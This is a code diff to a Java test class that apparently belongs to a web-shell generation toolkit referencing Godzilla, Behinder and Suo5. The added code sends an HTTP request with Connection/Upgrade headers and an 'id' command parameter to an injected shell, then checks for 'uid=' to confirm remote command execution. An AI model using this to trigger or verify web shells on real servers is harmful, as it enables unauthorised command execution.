@@ -14,6 +14,7 @@ import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.*;
 import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
 import com.reajason.javaweb.suo5.Suo5Manager;
+import com.reajason.javaweb.utils.CommonUtil;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
 import net.bytebuddy.jar.asm.Opcodes;
@@ -206,7 +207,27 @@ public class ShellAssertion {
                 godzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                 break;
             case Command:
-                commandIsOk(shellUrl, shellType, ((CommandConfig) generateResult.getShellToolConfig()).getParamName(), "id");
+                String paramName = ((CommandConfig) generateResult.getShellToolConfig()).getParamName();
+                if (ShellType.UPGRADE.equals(shellType)) {
+                    String shellClassName = generateResult.getShellClassName();
+                    OkHttpClient okHttpClient = new OkHttpClient();
+                    HttpUrl url = Objects.requireNonNull(HttpUrl.parse(shellUrl))
+                            .newBuilder()
+                            .addQueryParameter(paramName, "id")
+                            .build();
+                    Request request = new Request.Builder()
+                            .header("Connection", "Upgrade")
+                            .header("Upgrade", shellClassName)
+                            .url(url)
+                            .get().build();
+                    try (Response response = okHttpClient.newCall(request).execute()) {
+                        String res = response.body().string();
+                        System.out.println(res.trim());
+                        assertTrue(res.contains("uid="));
+                    }
+                } else {
+                    commandIsOk(shellUrl, shellType, paramName, "id");
+                }
                 break;
             case Behinder:
                 behinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
